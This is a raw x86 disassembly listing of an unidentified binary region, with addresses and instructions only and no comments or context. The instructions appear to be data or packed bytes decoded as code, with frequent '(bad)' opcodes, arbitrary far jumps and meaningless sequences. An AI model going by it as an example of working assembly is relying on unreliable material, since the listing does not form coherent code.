  41fcbf:	jns    0x41fcc9
  41fcc1:	push   edx
  41fcc2:	mov    eax,ds:0x45f77094
  41fcc7:	inc    ebx
  41fcc8:	iret   
  41fcc9:	inc    edi
  41fcca:	pminsw mm5,mm3
  41fccd:	inc    cx
  41fccf:	js     0x41fcc4
  41fcd1:	xor    ecx,ebx
  41fcd3:	mov    bh,0x15
  41fcd5:	loope  0x41fc7c
  41fcd7:	bound  edi,QWORD PTR [edx]
  41fcd9:	sub    al,0x9b
  41fcdb:	rcl    BYTE PTR [esi],1
  41fcdd:	(bad)  
  41fcde:	jle    0x41fd1b
  41fce0:	stos   BYTE PTR es:[edi],al
  41fce1:	inc    esi
  41fce2:	add    al,0xa6
  41fce4:	daa    
  41fce5:	aaa    
  41fce6:	test   DWORD PTR [ebx+esi*1],ebp
  41fce9:	jmp    0xeae6:0x69e2a510
  41fcf0:	jnp    0x41fd4a
  41fcf2:	outs   dx,BYTE PTR ds:[esi]
  41fcf3:	xor    eax,DWORD PTR [esi-0x129cd432]
  41fcf9:	call   0x9a54:0xc5017201
  41fd00:	cmp    DWORD PTR [edx],0xe04c4294
  41fd06:	cdq    
  41fd07:	xchg   esp,eax
  41fd08:	push   ebx
  41fd09:	inc    esi
  41fd0a:	lods   eax,DWORD PTR ds:[esi]
  41fd0b:	out    0x6b,eax
  41fd0d:	popf   
  41fd0e:	gs mov bh,0x95
  41fd11:	xchg   edi,eax
  41fd12:	push   esp
  41fd13:	mov    cl,0xcc
  41fd15:	pop    ss
  41fd16:	into   
  41fd17:	xlat   BYTE PTR ds:[ebx]
  41fd18:	push   0xe
  41fd1a:	jns    0x41fd09
  41fd1c:	out    0x63,al
  41fd1e:	mov    cl,0xbe
  41fd20:	sub    BYTE PTR [ecx-0x59],al
  41fd23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd24:	adc    ah,ah
  41fd26:	pop    ebx
  41fd27:	inc    esi
  41fd28:	mov    eax,0x52c1b6e5
  41fd2d:	xor    ebx,DWORD PTR [ebp+0x57e64cba]
  41fd33:	int    0xe9
  41fd35:	cmp    edi,DWORD PTR [ebp+0x6a]
  41fd38:	popf   
  41fd39:	pop    edx
  41fd3a:	mov    edx,0xfeaaa497
  41fd3f:	push   es
  41fd40:	loop   0x41fd1f
  41fd42:	rcr    DWORD PTR [edi-0x9afd7ed],1
  41fd48:	mov    ebp,DWORD PTR [edx-0x6c]
  41fd4b:	jp     0x41fd3c
  41fd4d:	sub    al,0x9f
  41fd4f:	inc    edi
  41fd50:	mov    BYTE PTR [esi+0x12],ah
  41fd53:	push   es
  41fd54:	pop    esi
  41fd55:	lods   al,BYTE PTR ds:[esi]
  41fd56:	mov    ebx,0xef6a3196
  41fd5b:	jmp    0x41fd44
  41fd5d:	(bad)  
  41fd5f:	sub    edi,DWORD PTR [esi+0x6f6fc473]
  41fd65:	fldcw  WORD PTR [ebp+0x7]
  41fd68:	(bad)
  41fd6b:	add    eax,0x2d2a0de1
  41fd70:	or     bl,BYTE PTR [eax-0xb]
  41fd73:	mov    dl,0x50
  41fd75:	and    al,dl
  41fd77:	inc    esi
  41fd78:	inc    edx
  41fd79:	in     eax,dx
  41fd7a:	stos   BYTE PTR es:[edi],al
  41fd7b:	loope  0x41fd51
  41fd7d:	out    0x99,al
  41fd7f:	out    dx,eax
  41fd80:	adc    al,0xf4
  41fd82:	fwait
  41fd83:	cmp    cl,al
  41fd85:	imul   esi,DWORD PTR ss:[ebx],0xffffff82
  41fd89:	pop    ds
  41fd8a:	sub    BYTE PTR [ebp-0x305d9848],0xeb
  41fd91:	(bad)  
  41fd92:	hlt    
  41fd93:	btc    DWORD PTR [ebp-0x63d8a81a],eax
  41fd9a:	sub    ebp,DWORD PTR [esi+ebx*1]
  41fd9d:	dec    edx
  41fd9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd9f:	xor    BYTE PTR [ecx],cl
  41fda1:	imul   ebx,eax,0xffffffe7
  41fda4:	ror    BYTE PTR [edi],0xcd
  41fda7:	loopne 0x41fd80
  41fda9:	cmp    ecx,edi
  41fdab:	mov    edx,0x2ee22a26
  41fdb0:	lods   al,BYTE PTR ds:[esi]
  41fdb1:	and    ebp,esp
  41fdb3:	add    DWORD PTR [edx-0x78],edi
  41fdb6:	sar    DWORD PTR [edi-0x3facfed0],1
  41fdbc:	fwait
  41fdbd:	push   0xb9b0a81e
  41fdc2:	stos   DWORD PTR es:[edi],eax
  41fdc3:	or     BYTE PTR [edi-0x11],cl
  41fdc6:	inc    ebx
  41fdc7:	div    DWORD PTR [ecx-0xea35bec]
  41fdcd:	push   eax
  41fdce:	add    bh,al
  41fdd0:	xchg   edi,eax
  41fdd1:	das    
  41fdd2:	mov    esi,0x48cb09c
  41fdd7:	retf   
  41fdd8:	inc    edx
  41fdd9:	mov    eax,0x50de4fe5
  41fdde:	and    eax,0x3096f6ba
  41fde3:	and    edx,esi
  41fde5:	xchg   edi,eax
  41fde6:	jp     0x41fd6d
  41fde8:	and    bh,BYTE PTR [esp+ecx*8]
  41fdeb:	mov    DWORD PTR [esi-0x256efb8f],ecx
  41fdf1:	sub    BYTE PTR [edi+0x3ec76818],cl
  41fdf7:	jae    0x41fda3
  41fdf9:	pop    esp
  41fdfa:	lods   eax,DWORD PTR ds:[esi]
  41fdfb:	pop    edi
  41fdfc:	mov    ecx,0xb642dde2
  41fe01:	sbb    ch,dl
  41fe03:	test   eax,0xdf55dff3
  41fe08:	xchg   BYTE PTR [edx],cl
  41fe0a:	sub    ecx,DWORD PTR [eax+edx*2-0x2a5751a2]
  41fe11:	std    
  41fe12:	cmp    bl,BYTE PTR ds:[ecx]
  41fe15:	pop    eax
  41fe16:	mov    ebx,0x34801c0a
  41fe1b:	dec    esi
  41fe1c:	daa    
  41fe1d:	addr16 push ebx
  41fe1f:	lds    eax,FWORD PTR [edi]
  41fe21:	vmread esp,edi
  41fe24:	pop    ss
  41fe25:	push   ebp
  41fe26:	jle    0x41fe62
  41fe28:	mov    cl,BYTE PTR [edx-0x67]
  41fe2b:	xchg   ebx,eax
  41fe2c:	sbb    ecx,DWORD PTR [edx-0x3a]
  41fe2f:	mov    bh,0xf3
  41fe31:	add    edi,edx
  41fe33:	ret    
  41fe34:	dec    edx
  41fe35:	inc    ebx
  41fe36:	adc    al,0xf1
  41fe38:	push   cs
  41fe39:	mov    esi,0x58c8a42d
  41fe3e:	fisttp QWORD PTR [ebx]
  41fe40:	ret    0xb307
  41fe43:	aaa    
  41fe44:	out    dx,al
  41fe45:	neg    BYTE PTR [edi]
  41fe47:	call   0x10f6:0x5a267c82
  41fe4e:	dec    edx
  41fe4f:	fwait
  41fe50:	sub    edx,eax
  41fe52:	aaa    
  41fe53:	out    0x15,eax
  41fe55:	and    esp,DWORD PTR [edx]
  41fe57:	dec    edi
  41fe58:	xor    dh,BYTE PTR [edx-0x4e]
  41fe5b:	cmp    esp,esp
  41fe5d:	mov    esp,0x334a9371
  41fe62:	out    dx,eax
  41fe63:	pop    ss
  41fe64:	sub    DWORD PTR [edi-0x6d],eax
  41fe67:	test   al,0x3d
  41fe69:	mov    ch,0x4e
  41fe6b:	dec    edx
  41fe6c:	dec    esp
  41fe6d:	test   DWORD PTR [edx-0x792f3731],esp
  41fe73:	jne    0x41fe30
  41fe75:	mov    eax,0x827715df
  41fe7a:	adc    ebx,DWORD PTR ds:0x63cd3c66
  41fe80:	dec    esp
  41fe81:	add    al,cl
  41fe83:	iret   
  41fe84:	pop    edi
  41fe85:	xchg   ebp,eax
  41fe86:	jge    0x41fe77
  41fe88:	test   DWORD PTR [ebp-0x45],0xba8bba2c
  41fe8f:	das    
  41fe90:	sbb    eax,0x899daefa
  41fe95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe96:	xchg   edi,eax
  41fe97:	cli    
  41fe98:	test   BYTE PTR [eax-0x5d],bl
  41fe9b:	cdq    
  41fe9c:	pop    es
  41fe9d:	jmp    0x9a02167
  41fea2:	pop    ecx
  41fea3:	enter  0x675b,0xd3
  41fea7:	dec    esi
  41fea8:	adc    ecx,DWORD PTR [ebx-0x335ee54d]
  41feae:	fild   QWORD PTR [esi-0x5ff6c396]
  41feb4:	pop    ss
  41feb5:	aaa    
  41feb6:	shl    BYTE PTR [esi+0x6d],cl
  41feb9:	xchg   BYTE PTR [ecx+0x3b],dh
  41febc:	loopne 0x41fec6
  41febe:	xor    bh,0x16
  41fec1:	adc    eax,0x4f8383b5
  41fec6:	es addr16 inc si
  41feca:	dec    ecx
  41fecb:	lods   al,BYTE PTR ds:[esi]
  41fecc:	cmc    
  41fecd:	sbb    DWORD PTR [ebp-0x7dda7937],esi
  41fed3:	test   eax,0x966fd519
  41fed8:	fcomp  st(3)
  41feda:	xchg   BYTE PTR [ebp+esi*1+0x26],bh
  41fede:	test   al,0xa6
  41fee0:	repz popa 
  41fee2:	xor    DWORD PTR [ebx-0x24],eax
  41fee5:	ds popa 
  41fee7:	xor    eax,DWORD PTR [esi+0x63766940]
  41feed:	push   ebp
  41feee:	movaps xmm2,XMMWORD PTR [edi]
  41fef1:	pop    eax
  41fef2:	xchg   ebp,eax
  41fef3:	aad    0xbd
  41fef5:	sbb    eax,0x7d551a46
  41fefa:	imul   edx,DWORD PTR [edi+0x4a],0x2c
  41fefe:	push   esp
  41feff:	dec    ebx
  41ff00:	into   
  41ff01:	call   0x85df:0xf12fb09
  41ff08:	js     0x41ff65
  41ff0a:	stc    
  41ff0b:	xor    ch,ch
  41ff0d:	or     bl,BYTE PTR [ebx-0x2e]
  41ff10:	add    dh,BYTE PTR ds:0xff0d7607
  41ff16:	sbb    al,0x37
  41ff18:	leave  
  41ff19:	and    eax,0xd2b486ba
  41ff1e:	xchg   ecx,eax
  41ff1f:	adc    eax,0x4cbd3477
  41ff24:	sub    bl,BYTE PTR [edx]
  41ff26:	cmp    BYTE PTR [ebp-0x45],bh
  41ff29:	inc    edx
  41ff2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff2b:	xchg   DWORD PTR [esp+ebp*8],ebp
  41ff2e:	hlt    
  41ff2f:	jbe    0x41fedb
  41ff31:	into   
  41ff32:	mov    esp,0x5eb4af3
  41ff37:	xchg   esp,eax
  41ff38:	adc    eax,0xcd661a74
  41ff3d:	dec    edi
  41ff3e:	mov    esp,0xb6a64a7e
  41ff43:	and    al,0x6f
  41ff45:	mov    ch,dl
  41ff47:	dec    esi
  41ff48:	dec    ecx
  41ff49:	or     DWORD PTR [ebp+0x32b2fb96],edi
  41ff4f:	(bad)  
  41ff50:	push   esi
  41ff51:	or     ch,ah
  41ff53:	fidivr WORD PTR [ebp-0x5c]
  41ff56:	mov    bl,0x17
  41ff58:	pop    es
  41ff59:	jae    0x41ff3c
  41ff5b:	stos   DWORD PTR es:[edi],eax
  41ff5c:	jmp    0x41ff32
  41ff5e:	int3   
  41ff5f:	sbb    al,0x75
  41ff61:	cs nop
  41ff63:	mov    eax,ds:0x17e879d2
  41ff68:	adc    al,0xe9
  41ff6a:	push   esi
  41ff6b:	out    0x3f,eax
  41ff6d:	mov    bl,0xa5
  41ff6f:	pop    ss
  41ff70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff71:	outs   dx,BYTE PTR ds:[esi]
  41ff72:	popa   
  41ff73:	call   FWORD PTR [edi]
  41ff75:	js     0x41ffdc
  41ff77:	inc    ebx
  41ff78:	lahf   
  41ff79:	mov    bh,0xd7
  41ff7b:	pop    ebx
  41ff7c:	adc    dh,bl
  41ff7e:	ret    0x4749
  41ff81:	pop    esp
  41ff82:	ficom  DWORD PTR [esi-0x382c4a93]
  41ff88:	rol    BYTE PTR [esi-0x60a5abbf],1
  41ff8e:	push   ecx
  41ff8f:	push   ecx
  41ff90:	dec    esp
  41ff91:	lods   al,BYTE PTR ds:[esi]
  41ff92:	test   BYTE PTR [esi],bh
  41ff94:	test   eax,0x6dbfe77d
  41ff99:	cld    
  41ff9a:	mul    bl
  41ff9c:	pop    ds
  41ff9d:	and    esi,edi
  41ff9f:	jle    0x42001b
  41ffa1:	jmp    FWORD PTR [esi+0x6e]
  41ffa4:	rep lods eax,DWORD PTR ds:[esi]
  41ffa6:	cwde   
  41ffa7:	push   ds
  41ffa8:	rcl    BYTE PTR [ebx-0x48161677],1
  41ffae:	jge    0x41ff7a
  41ffb0:	mov    ch,0xb8
  41ffb2:	dec    edx
  41ffb3:	adc    eax,0x3b41cc15
  41ffb8:	out    0x48,eax
  41ffba:	xor    ebx,DWORD PTR [ecx-0x14]
  41ffbd:	jge    0x41ff5e
  41ffbf:	lahf   
  41ffc0:	ss (bad) 
  41ffc2:	mov    ecx,0xa9cf62da
  41ffc7:	push   es
  41ffc8:	xor    DWORD PTR [ebx+0x5088d31c],edi
  41ffce:	int    0x24
  41ffd0:	and    ecx,edx
  41ffd2:	xor    al,0x82
  41ffd4:	inc    esi
  41ffd5:	in     eax,dx
  41ffd6:	xchg   DWORD PTR [edi+ebx*2],edx
  41ffd9:	lods   al,BYTE PTR ds:[esi]
  41ffda:	mov    esi,0x3a584fcc
  41ffdf:	(bad)  
  41ffe0:	lahf   
  41ffe1:	inc    ebx
  41ffe2:	sub    edx,DWORD PTR [esi]
  41ffe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffe5:	pop    esi
  41ffe6:	mov    ebx,0x9451d319
  41ffeb:	jno    0x41ff8c
  41ffed:	in     al,dx
  41ffee:	es retf 0x2320
  41fff2:	inc    edi
  41fff3:	and    eax,0x626a0fe6
  41fff8:	sub    al,0x83
  41fffa:	test   BYTE PTR [eax+ebp*2+0x33],ah
  41fffe:	mov    dh,0x9e
  420000:	add    DWORD PTR [ebp+0x73527773],esi
  420006:	mov    ds,WORD PTR [ecx]
  420008:	stos   BYTE PTR es:[edi],al
  420009:	into   
  42000a:	pop    ebp
  42000b:	(bad)  
  42000c:	gs cmp eax,0xb6daeb8f
  420012:	ffreep st(6)
  420014:	adc    al,0xbe
  420016:	fs ins BYTE PTR es:[edi],dx
  420018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420019:	xor    al,0xee
  42001b:	push   ebp
  42001c:	js     0x420025
  42001e:	mov    ah,0xbd
  420020:	dec    edi
  420021:	or     BYTE PTR [edx+ebx*8],dl
  420024:	sbb    eax,edi
  420026:	mov    edi,0xaf00493
  42002b:	sbb    al,0x8e
  42002d:	sub    DWORD PTR [esi-0x5c7ba338],edx
  420033:	fsubr  QWORD PTR [ebp-0x55]
  420036:	mov    ecx,0x7de67f4e
  42003b:	inc    edx
  42003c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42003d:	mov    bh,BYTE PTR [edx-0x80]
  420040:	sahf   
  420041:	xor    dh,BYTE PTR [esi-0x7e1f6384]
  420047:	mov    bl,0x71
  420049:	and    dl,ch
  42004b:	pop    edi
  42004c:	xor    eax,0xee057258
  420051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420052:	lea    eax,[esp+eiz*8]
  420055:	aas    
  420056:	sbb    eax,DWORD PTR [ebx-0x2d]
  420059:	xchg   edi,eax
  42005a:	xor    eax,0x954a919f
  42005f:	sti    
  420060:	pop    bp
  420062:	imul   edi,DWORD PTR [eax+0x60],0xffffffc9
  420066:	sub    eax,0x9db79c7b
  42006b:	cmp    BYTE PTR [ebx+0x6f8cdda0],ah
  420071:	dec    eax
  420072:	shl    ebx,1
  420074:	and    bl,dl
  420076:	add    eax,0x96762848
  42007b:	mov    ah,0x44
  42007d:	and    esp,eax
  42007f:	mov    ch,0xee
  420081:	call   0x9d462047
  420086:	(bad)  
  420087:	xchg   edx,eax
  420088:	ja     0x420087
  42008a:	xor    eax,0x4477f57d
  42008f:	jb     0x4200f7
  420091:	or     eax,0x27de6b0e
  420096:	sahf   
  420097:	retf   
  420098:	adc    eax,0xcbe3e0bc
  42009d:	pop    ss
  42009e:	xchg   esp,eax
  42009f:	push   edi
  4200a0:	loope  0x420044
  4200a2:	xor    eax,edx
  4200a4:	add    edx,DWORD PTR [ebx+0x55ab99b9]
  4200aa:	les    eax,FWORD PTR [eax-0x6871839e]
  4200b0:	imul   esi,DWORD PTR [esi-0x3c],0xf
  4200b4:	popa   
  4200b5:	aad    0x3e
  4200b7:	fbld   TBYTE PTR [ebx-0x18]
  4200ba:	mov    ch,0xba
  4200bc:	cmp    esi,edi
  4200be:	and    eax,edx
  4200c0:	rcr    BYTE PTR [ebx],0x3a
  4200c3:	cmp    al,BYTE PTR [edx-0x49dbd649]
  4200c9:	push   ss
  4200ca:	and    eax,0x134ceab2
  4200cf:	and    eax,0xd49e10be
  4200d4:	(bad)  
  4200d5:	xchg   esi,eax
  4200d6:	inc    eax
  4200d7:	and    eax,0xf9c61e77
  4200dc:	int3   
  4200dd:	in     al,dx
  4200de:	adc    eax,0x63e96642
  4200e3:	xchg   ebx,eax
  4200e4:	loop   0x4200aa
  4200e6:	xrstor [esi]
  4200e9:	mov    al,0xdc
  4200eb:	test   al,0x3f
  4200ed:	add    esi,DWORD PTR [eax+0x457d9fc]
  4200f3:	sub    esp,ecx
  4200f5:	xor    ebx,ecx
  4200f7:	jno    0x4200c4
  4200f9:	lds    ecx,FWORD PTR [esi-0x2415710f]
  4200ff:	dec    ebp
  420100:	jbe    0x42010b
  420102:	pop    ss
  420103:	push   0x1a
  420105:	push   eax
  420106:	icebp  
  420107:	(bad)  
  420108:	gs fdivp st(6),st
  42010b:	or     ecx,DWORD PTR [eax+0x53c3856f]
  420111:	sub    esp,DWORD PTR [edx]
  420113:	adc    cl,BYTE PTR [ecx-0x3dfe649d]
  420119:	arpl   dx,sp
  42011b:	add    ch,BYTE PTR [eax]
  42011d:	cmp    eax,0xbd496cce
  420122:	or     al,0x3a
  420124:	popf   
  420125:	imul   ecx,DWORD PTR [edi+0x1c97df2a],0x53a39b62
  42012f:	loopne 0x420147
  420131:	sbb    al,0xf4
  420133:	lea    eax,[ecx-0x15]
  420136:	mov    dl,0x14
  420138:	or     DWORD PTR es:[edi],0xd8ca4b82
  42013f:	mov    esp,0x7dca2e69
  420144:	mov    dl,0xd0
  420146:	sbb    eax,0x475b1acc
  42014b:	xor    DWORD PTR [esp+esi*2-0x7c941a8],0xffffffa3
  420153:	cmp    eax,0x8bf6b81
  420158:	mov    ecx,0xf436a9fe
  42015d:	fld    TBYTE PTR [ebx+0x53]
  420160:	mov    dh,0x17
  420162:	adc    dl,BYTE PTR ds:0x62f0bd54
  420168:	(bad)
  42016b:	bound  esi,QWORD PTR [ecx]
  42016d:	jecxz  0x42010e
  42016f:	aaa    
  420170:	pop    ss
  420171:	cmp    edx,edi
  420173:	cwde   
  420174:	mov    dh,0x84
  420176:	cmc    
  420177:	jg     0x4201bd
  420179:	mov    ch,0x9f
  42017b:	out    0x52,al
  42017d:	fdiv   DWORD PTR [edx]
  42017f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420180:	cdq    
  420181:	sbb    ah,BYTE PTR [ecx]
  420183:	mov    eax,0xadda310c
  420188:	pop    ebx
  420189:	into   
  42018a:	adc    dh,BYTE PTR [esi-0x3b335404]
  420190:	xchg   ecx,eax
  420191:	add    ecx,DWORD PTR ds:0x3fb5edcd
  420197:	les    ecx,FWORD PTR [eax]
  420199:	push   es
  42019a:	cs ins DWORD PTR es:[edi],dx
  42019c:	aas    
  42019d:	loopne 0x4201a8
  42019f:	mov    ds:0x54eb7f69,eax
  4201a4:	hlt    
  4201a5:	mov    esp,0xc48675a
  4201aa:	jbe    0x420219
  4201ac:	or     ch,BYTE PTR [ebp-0x4]
  4201af:	retf   0xec2c
  4201b2:	adc    BYTE PTR [edi-0x4f81faea],al
  4201b8:	std    
  4201b9:	sbb    DWORD PTR [edx-0x1b],0x452ad0a1
  4201c0:	outs   dx,DWORD PTR ds:[esi]
  4201c1:	ins    BYTE PTR es:[edi],dx
  4201c2:	mov    edx,0xdd3d2bc6
  4201c7:	ds cmp eax,0xa44df7c6
  4201cd:	mov    esi,0xc1274982
  4201d2:	cmp    eax,0x87dc13cf
  4201d7:	sar    DWORD PTR [esi-0x5369b2ae],1
  4201dd:	mov    bl,0x7c
  4201df:	cmp    BYTE PTR [edi-0x1c],dl
  4201e2:	mov    cl,0x90
  4201e4:	pop    es
  4201e5:	add    ah,al
  4201e7:	jo     0x4201be
  4201e9:	fsub   DWORD PTR [eax]
  4201eb:	xchg   BYTE PTR [ebp+0x671a21fe],ch
  4201f1:	and    al,0xf9
  4201f4:	(bad)  
  4201f5:	int3   
  4201f6:	(bad)  
  4201f7:	ds xchg ebp,eax
  4201f9:	repz fsub DWORD PTR [edx+0x2a]
  4201fd:	fadd   DWORD PTR [eax]
  4201ff:	and    al,0x52
  420201:	jmp    0xea1d:0x6f389db1
  420208:	push   cs
  420209:	dec    ecx
  42020a:	retf   0xf394
  42020d:	sahf   
  42020e:	in     eax,dx
  42020f:	sub    dl,BYTE PTR [edi]
  420211:	jecxz  0x4201b1
  420213:	pop    esp
  420214:	icebp  
  420215:	jecxz  0x42020f
  420217:	outs   dx,DWORD PTR ds:[esi]
  420218:	cmp    DWORD PTR [eax],0x5e
  42021b:	inc    esi
  42021c:	jg     0x420249
  42021e:	test   DWORD PTR [ebx+ecx*4],esi
  420221:	dec    ebx
  420222:	adc    DWORD PTR [edi-0x7912c987],ebp
  420228:	sar    DWORD PTR [edx+0x189943b7],0x41
  42022f:	rol    DWORD PTR [ecx+eiz*4+0x4fdfd9e3],0x6c
  420237:	or     ebp,0x66
  42023a:	inc    edi
  42023b:	cdq    
  42023c:	in     al,0x57
  42023e:	scas   al,BYTE PTR es:[edi]
  42023f:	fnsave [edx-0x28]
  420242:	repz std 
  420244:	mov    ebp,gs
  420246:	adc    BYTE PTR [eax],0x45
  420249:	das    
  42024a:	stos   DWORD PTR es:[edi],eax
  42024b:	mov    esi,0xedeec888
  420250:	cmp    BYTE PTR [eax],dh
  420252:	push   ebp
  420253:	mov    bh,0x47
  420255:	pop    eax
  420256:	and    eax,0xf7e2ab07
  42025b:	lods   eax,DWORD PTR ds:[esi]
  42025c:	jp     0x420206
  42025e:	push   edi
  42025f:	xchg   esi,eax
  420260:	xchg   ebx,eax
  420261:	inc    ebp
  420262:	dec    ecx
  420263:	mov    eax,0xe6ff9388
  420268:	cmp    BYTE PTR [edx*2+0xd9539d9],cl
  42026f:	hlt    
  420270:	and    bl,BYTE PTR [esp+edi*1]
  420273:	aaa    
  420274:	add    bl,ah
  420276:	rol    DWORD PTR [ebp+0x54],1
  420279:	sbb    edx,ebp
  42027b:	neg    BYTE PTR [edi+ecx*2+0x2ec0fef4]
  420282:	in     eax,dx
  420283:	xor    edx,ebp
  420285:	or     ebp,DWORD PTR [ebp+0x0]
  420288:	sti    
  420289:	inc    esp
  42028a:	shr    BYTE PTR [esi+0x3b83ac1],cl
  420290:	out    0x99,al
  420292:	add    dl,dl
  420294:	sar    BYTE PTR [ecx-0x55ae8100],1
  42029a:	fmul   QWORD PTR [ebx+0x3bee922f]
  4202a0:	push   0xffffffc5
  4202a2:	cmp    BYTE PTR [ebx+0x3b5faca],cl
  4202a8:	xchg   bl,dl
  4202aa:	mov    bh,cl
  4202ac:	lods   al,BYTE PTR ds:[esi]
  4202ad:	addr16 push 0x24
  4202b0:	xchg   esp,eax
  4202b1:	frstor [ecx-0x7cd8aae2]
  4202b7:	adc    al,0x81
  4202b9:	and    BYTE PTR [ecx-0x44],al
  4202bc:	stc    
  4202bd:	xlat   BYTE PTR ds:[ebx]
  4202be:	sub    ecx,ecx
  4202c0:	in     eax,0xf3
  4202c2:	shl    BYTE PTR [eax+0x71a162e2],cl
  4202c8:	add    esp,DWORD PTR [eax-0x6456cbd2]
  4202ce:	js     0x420288
  4202d0:	sbb    al,0xca
  4202d2:	dec    edi
  4202d3:	mov    al,0xad
  4202d5:	xchg   edi,eax
  4202d6:	in     al,0xec
  4202d8:	data16 cld 
  4202da:	das    
  4202db:	retf   0x1074
  4202de:	iret   
  4202df:	xor    ah,BYTE PTR [edi+eiz*8+0x37692b05]
  4202e6:	and    edx,DWORD PTR [ebx+0x3]
  4202e9:	pop    ss
  4202ea:	and    DWORD PTR [esp+ebx*8-0xb23b175],0x99c411a9
  4202f5:	(bad)  
  4202f6:	jo     0x42029f
  4202f8:	js     0x420379
  4202fa:	adc    edi,ebp
  4202fc:	add    BYTE PTR [ebx],0xf2
  4202ff:	out    dx,eax
  420300:	test   DWORD PTR [edi+0x18],eax
  420303:	xchg   DWORD PTR [esi],edx
  420305:	jnp    0x420320
  420307:	sub    esp,DWORD PTR [ecx-0x6e]
  42030a:	test   al,0x6
  42030c:	div    BYTE PTR [eax-0x11]
  42030f:	mov    ch,0xaf
  420311:	adc    dl,BYTE PTR [esi]
  420313:	ins    BYTE PTR es:[edi],dx
  420314:	push   esi
  420315:	cmp    DWORD PTR [edi+0x8541c48],esi
  42031b:	leave  
  42031c:	xchg   ecx,eax
  42031d:	ffreep st(0)
  42031f:	bound  edi,QWORD PTR [ecx-0x674e0a85]
  420325:	int    0x73
  420327:	out    dx,eax
  420328:	stos   BYTE PTR es:[edi],al
  420329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42032a:	fsubp  st(0),st
  42032c:	std    
  42032d:	ins    DWORD PTR es:[edi],dx
  42032e:	das    
  42032f:	dec    bp
  420331:	fmulp  st(2),st
  420333:	adc    esi,0x78
  420336:	jae    0x420384
  420338:	sub    al,0xda
  42033a:	cmc    
  42033b:	jl     0x4202f1
  42033d:	sbb    BYTE PTR [edx],al
  42033f:	adc    DWORD PTR [esi+0x4aef7109],ebx
  420345:	nop
  420346:	add    al,0x5e
  420348:	scas   eax,DWORD PTR es:[edi]
  420349:	daa    
  42034a:	int3   
  42034b:	aaa    
  42034c:	dec    BYTE PTR [edx-0x1c]
  42034f:	mov    dh,0xb5
  420351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420352:	imul   esi,DWORD PTR [esp+eax*1-0x256c9cf4],0xcc37371b
  42035d:	cmp    al,0x70
  42035f:	(bad)  
  420360:	mov    esp,0xf4fdfbb0
  420365:	mov    es,WORD PTR [edx+ecx*2]
  420368:	test   BYTE PTR [ecx],al
  42036a:	fcom   QWORD PTR [ebx-0x3a2f9b80]
  420370:	mov    dh,dh
  420372:	and    BYTE PTR [ebp+0x59],bl
  420375:	fild   QWORD PTR [ebx+edi*4]
  420378:	cmp    BYTE PTR [ecx-0x63],bh
  42037b:	jmp    0xfba:0xf4e97ead
  420382:	aam    0x14
  420384:	outs   dx,BYTE PTR ds:[esi]
  420385:	jb     0x42031a
  420387:	fcom   QWORD PTR [ebx+eax*1]
  42038a:	xor    BYTE PTR [edx+0x322c9425],dh
  420390:	test   BYTE PTR [edi],dl
  420392:	push   ebp
  420393:	ins    DWORD PTR es:[edi],dx
  420394:	or     dl,cl
  420396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420397:	iret   
  420398:	pop    ebx
  420399:	or     edi,DWORD PTR [ebx-0x51]
  42039c:	pop    edi
  42039d:	jbe    0x420343
  42039f:	jne    0x420358
  4203a1:	push   ecx
  4203a2:	xor    esp,DWORD PTR [ebx+0x6d]
  4203a5:	sbb    BYTE PTR [ebx+0xd],ch
  4203a8:	daa    
  4203a9:	pop    ebp
  4203aa:	mov    esi,0x7247f603
  4203af:	gs imul esi,ebx,0xffffffda
  4203b3:	retf   
  4203b4:	push   ds
  4203b5:	aad    0x73
  4203b7:	je     0x42039c
  4203b9:	dec    ebp
  4203ba:	pop    edx
  4203bb:	xor    DWORD PTR [ecx],0xf94e50ef
  4203c1:	pop    ds
  4203c2:	xor    DWORD PTR [eax],edi
  4203c4:	mov    ch,0xbb
  4203c6:	inc    esp
  4203c7:	inc    edi
  4203c8:	je     0x42040d
  4203ca:	xor    edi,DWORD PTR [edi-0x80]
  4203cd:	pop    esi
  4203ce:	scas   al,BYTE PTR es:[edi]
  4203cf:	xor    eax,0xdd4ab768
  4203d4:	xor    BYTE PTR [edx+0x36],ah
  4203d7:	pop    es
  4203d8:	push   ecx
  4203d9:	in     al,dx
  4203da:	sbb    eax,DWORD PTR [ecx-0x39]
  4203dd:	ins    DWORD PTR es:[edi],dx
  4203de:	adc    DWORD PTR [ebx],esp
  4203e0:	inc    esi
  4203e1:	inc    ebp
  4203e2:	and    eax,0x919ad3bf
  4203e7:	loop   0x42044d
  4203e9:	mov    ?,esi
  4203eb:	loop   0x4203e7
  4203ed:	faddp  st(4),st
  4203ef:	fist   WORD PTR [edx-0x146f950a]
  4203f5:	or     BYTE PTR [edx-0x74],bl
  4203f8:	dec    esi
  4203f9:	cmp    eax,0xfdb43c53
  4203fe:	inc    eax
  4203ff:	js     0x42039d
  420401:	cmp    DWORD PTR [ebx-0x42],0xffffffe6
  420405:	xor    eax,0x920b7b00
  42040a:	aam    0xb3
  42040c:	push   ds
  42040d:	sub    bh,bl
  42040f:	xchg   ebx,eax
  420410:	cmp    ebx,DWORD PTR [edi]
  420412:	add    DWORD PTR [ebx],ebx
  420414:	pop    esp
  420415:	dec    ebp
  420416:	aam    0x31
  420418:	(bad)  
  420419:	call   0xf4931576
  42041e:	mov    ah,0x54
  420420:	stos   DWORD PTR es:[edi],eax
  420421:	sbb    esi,DWORD PTR [edi+ebx*2-0x59]
  420425:	out    dx,eax
  420426:	sub    DWORD PTR [eax],ebx
  420428:	scas   eax,DWORD PTR es:[edi]
  420429:	sub    DWORD PTR [eax+ecx*2],0xffffffbc
  42042d:	loopne 0x420442
  42042f:	dec    edi
  420430:	jecxz  0x420406
  420432:	mov    dh,0xeb
  420434:	jmp    0x420443
  420436:	add    cl,dl
  420438:	cdq    
